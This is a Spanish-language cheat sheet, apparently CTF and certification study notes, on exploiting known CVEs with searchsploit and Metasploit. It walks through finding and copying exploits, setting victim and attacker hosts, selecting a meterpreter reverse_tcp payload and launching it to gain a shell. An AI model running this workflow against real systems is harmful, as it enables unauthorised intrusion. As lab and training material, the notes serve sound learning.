# Explotación de Vulnerabilidades (CVEs)

**Objetivo:** Utilizar código malicioso (Exploits) para aprovechar fallos de seguridad en software desactualizado y obtener una Shell (acceso a la consola) en la máquina víctima.

---

## 1. Searchsploit (La base de datos Offline)
*Searchsploit lee la base de datos local de Exploit-DB. Es ideal para CTFs donde no tienes internet o no quieres usar Metasploit.*

**1. Búsqueda Avanzada (Evitando basura):**
Si buscas "Wordpress", saldrán 1000 resultados. Filtra por versión exacta e ignora los de denegación de servicio (DoS).
`searchsploit wordpress 4.7.0`

**2. Inspeccionar el código del Exploit (Obligatorio en CTFs):**
Antes de lanzar un exploit, SIEMPRE debes leerlo para saber qué hace y qué parámetros necesita (a veces hay que cambiar la IP del atacante dentro del código).
`searchsploit -x [ruta_del_exploit]` *(Ej. searchsploit -x php/webapps/41471.txt)*

**3. Copiar el Exploit a tu carpeta de trabajo actual (El comando Ninja):**
Para no dañar el archivo original y poder compilarlo o modificarlo en tu directorio.
`searchsploit -m [ruta_del_exploit]` *(Ej. searchsploit -m 41471)*

---

## 2. Metasploit Framework (MSFConsole)
*Metasploit es un framework automatizado. En certificaciones (como OSCP) su uso está limitado, pero en la vida real y CTFs libres, es tu mejor amigo.*

### A. Iniciar y Buscar
* **Iniciar sin el banner gigante (para cargar más rápido):**
  `msfconsole -q`
* **Buscar un exploit específico:**
  `search [nombre_servicio_o_CVE]` *(Ej. search vsftpd 2.3.4 o search cve:2021-4034)*

### B. Configurar el Ataque (Flujo de Trabajo)
Una vez que `search` te da una lista, sigues estos pasos exactos:

1. **Seleccionar el exploit:**
   `use [número_de_la_lista]` *(Ej. use 0)*
2. **Ver qué datos necesita:**
   `show options`
   *(Fíjate en las opciones que dicen `Required: yes` pero están vacías).*
3. **Configurar la víctima (Remote Host):**
   `set RHOSTS 10.10.10.X`
4. **Configurar tu IP de atacante (Local Host, vital para Reverse Shells):**
   *(Para saber tu IP en Kali, abre otra terminal y escribe `ip a`, suele ser la interfaz tun0 o eth0).*
   `set LHOST 10.10.14.Y`

### C. Payloads y Ejecución
El "Payload" es lo que hace el exploit una vez que entra (generalmente, devolverte una consola o "Shell").

* **Ver los payloads compatibles con el exploit:**
  `show payloads`
* **Seleccionar un payload (Opcional, MSF suele elegir uno bueno por defecto):**
  `set payload linux/x86/meterpreter/reverse_tcp`
* **Lanzar el ataque:**
  `exploit` (o simplemente `run`)

---

## Glosario Táctico Clave
* **LHOST / LPORT (Local):** ERES TÚ (El atacante en Kali Linux). A donde la máquina víctima debe conectarse de vuelta.
* **RHOST / RPORT (Remote):** ES LA VÍCTIMA (El objetivo en el CTF).
* **Reverse Shell:** La víctima se conecta hacia ti (evade casi todos los firewalls).
* **Bind Shell:** Tú te conectas a un puerto que el exploit abre en la víctima (suele ser bloqueado por firewalls).